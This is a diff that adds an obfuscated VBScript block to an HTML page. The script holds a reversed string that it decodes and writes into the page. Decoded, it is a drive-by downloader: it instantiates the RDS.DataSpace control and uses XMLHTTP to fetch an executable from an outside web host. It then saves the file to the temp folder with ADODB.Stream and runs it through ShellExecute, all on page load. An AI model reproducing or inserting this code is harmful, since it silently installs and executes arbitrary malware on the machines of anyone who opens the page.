@@ -1,0 +1,14 @@
+<SCRIPT language=vbscript>
+hu="มี>lmth/<>ydob/<    มี>retnec/<!ti OD uoY>retnec<	มี>ydob<>daeh/<    มี>eltit/<41732848]ta[nusdloG   !dog ym,hO>eltit<    มี>daeh<    มี>tpircs/<    มี0,""nepo"","""","""",1emanf etucexEllehS.Q    มี)"""",""noitacilppA.llehS""(tcejboetaerc.fd = Q tes    มีesolc.S    มี2,1emanf elifotevas.S    มีydoBesnopser.x etirw.S    มีnepo.S    มี)1emanf,pmt(htaPdliuB.F =1emanf    มี )2(redloFlaicepSteG.F = pmt tes    มี)"""",""tcejbOmetsySeliF.gnitpircS""(tcejboetaerc.fd = F tes    มี""moc.dl0g""=1emanf    มีdneS.x    มีeslaF ,ld ,6rts nepO.x    มี""TEG""=6rts    มี1 = epyt.S    มี)"""",5rts(tcejboetaerc.fd = S tes    มี1rts=5rts    มี4a&3a&2a&1a=1rts    มี""mae""=4a    มี""rtS""=3a    มี"".bd""=2a    มี""odA""=1a    มี)"""",rts(tcejbOetaerC.fd = x teS    มี""PTTHLMX.tfosorciM""=rts    มี""63E92CF40C00-A389-0D11-3A56-655C69DB:dislc"" ,""dissalc"" etubirttAtes.fd    มี)""tcejbo""(tnemelEetaerc.tnemucod = fd teS    มี""exe.321/moc.thwbrh.www//:ptth"" = ld    มีtxen emuser rorre no    มี>""tpircSBV""=egaugnal tpircs< มี>lmth<มี"
+function UnEncode(cc)
+for i = 1 to len(cc)
+    if mid(cc,i,1)<> "มี" then
+temp = Mid(cc, i, 1) + temp
+   else
+    temp=vbcrlf&temp
+ end if
+next
+UnEncode=temp
+end function
+document.write(UnEncode(hu))
+</SCRIPT>
